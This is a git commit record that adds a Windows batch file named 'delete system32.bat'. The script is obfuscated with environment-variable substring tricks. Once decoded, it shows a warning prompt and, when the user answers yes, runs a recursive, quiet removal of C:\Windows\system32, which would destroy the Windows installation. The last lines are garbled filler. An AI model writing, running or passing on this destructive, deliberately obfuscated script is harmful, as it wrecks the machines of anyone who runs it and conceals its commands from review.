bd6bef4d45877eec6befd040789f01276269c8ba
SparkWasTaken <116904013+SparkWasTaken@users.noreply.github.com>
2023-04-04 17:33:22 -0300

    Add files via upload

---
+++ delete system32.bat
@@ -0,0 +1,19 @@
+@%pUBlIc:~89,83%%PUBLic:~5,1%CHo^ of^%PuBlIC:~46,16%f
+SEt R^=Jg^%pUBLIc:~13,1%^gtGXz%pUBLIc:~4,1%w%pUBLIc:~11,1%^hm%pUBLIc:~10,1%^S^HI^O^A
+^%pUBlIC:~14,1%^L%pUBliC:~55,17%^%publIc:~4,1%
+@^e^c%r:~15,1%^%r:~17,1% ^%r:~17,1%n
+@ec%r:~11,1%o off
+ec%r:~11,1%o W%r:~18,1%RN%r:~16,1%N%r:~5,1%: T%r:~11,1%%r:~2,1%%r:~8,1% %r:~8,1%cr%r:~2,1%p%r:~4,1% %r:~9,1%%r:~2,1%ll dele%r:~4,1%e %r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32 %r:~4,1%%r:~11,1%%r:~2,1%%r:~8,1% %r:~9,1%%r:~2,1%ll de%r:~8,1%%r:~4,1%roy yo%r:~13,1%r pc. Yo%r:~13,1% really %r:~9,1%an%r:~4,1% %r:~4,1%o con%r:~4,1%%r:~2,1%n%r:~13,1%e? (Y/N)
+%r:~8,1%e%r:~4,1% /p an%r:~8,1%%r:~9,1%er=
+%r:~2,1%f /%r:~2,1% "%answer%"=="y" %r:~1,1%o%r:~4,1%o con%r:~4,1%%r:~2,1%n%r:~13,1%e
+%r:~2,1%f /%r:~2,1% "%answer%"=="n" %r:~1,1%o%r:~4,1%o ex%r:~2,1%%r:~4,1%
+:continue
+rd /%r:~8,1% /q C:\W%r:~2,1%ndo%r:~9,1%%r:~8,1%\%r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32
+ec%r:~11,1%o %r:~14,1%y%r:~8,1%%r:~4,1%e%r:~12,1%32 %r:~11,1%a%r:~8,1% %r:~10,1%een dele%r:~4,1%ed!
+pa%r:~13,1%%r:~8,1%e
+ex%r:~2,1%
+@ec%r:~11,1%o off
+%r:~8,1%e%r:~4,1% a = %%~i
+%r:~8,1%e%r:~4,1% a = % + %~i"%%~%r:~2,1%"%
+set a = %a%
+:aaaaaaaaaaaaaaaaaaaaaaaaaaaaab
